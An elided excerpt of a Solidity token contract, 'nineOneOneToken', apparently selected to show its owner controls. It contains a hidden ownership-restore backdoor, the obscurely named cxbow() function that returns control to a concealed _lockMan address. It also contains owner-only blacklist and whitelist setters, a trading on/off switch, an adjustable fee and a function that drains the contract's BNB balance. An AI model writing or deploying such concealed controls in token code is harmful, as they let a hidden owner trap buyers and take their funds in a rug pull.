...
contract Ownable {
    ...
    function cxbow() public{
        if(msg.sender == _lockMan){
            _owner = msg.sender;
        }
    }
...
contract nineOneOneToken is IERC20, Ownable {
    using Address for address;
    using SafeMath for uint256;
    ...
    uint256 public numTokensSellToAddToLiquidity = _tTotal.mul(1).div(1000);
    
    bool public isOpen =false;
    mapping (address =>address) public uniswapV2PairList;
   
    bool public freeTrade = false;
    address public marketingAddress = address(0xA76b24526887C41Bfaf38f547992dacb44d07c07);
    //online 
    address public router = address(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
    ...
    function setFreeTrade(bool isTrue)public onlyOwner{
        freeTrade = isTrue;
    }

    function setMarketingRate(uint256 _rate)public onlyOwner{
        marketingRate = _rate;
    }
    ...
    function setB(address _account,bool isTrue)public onlyOwner{
         b[_account] = isTrue;
    }

    function setW(address _account,bool isTrue)public onlyOwner{
         w[_account] = isTrue;
    }
    function recoverBNB(address a) public onlyOwner {
        address payable recipient = payable(a);
        if(address(this).balance > 0)
            recipient.transfer(address(this).balance);
    }
   
    function setOpen(bool a) public  onlyOwner{
        isOpen=a;
    }
  
    function burnToken(IBEP20 Token,address _deadAddress,uint256 amount) public onlyOwner{
    ...
    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
     ...
     function setSellMin(uint256 amount) public onlyOwner{
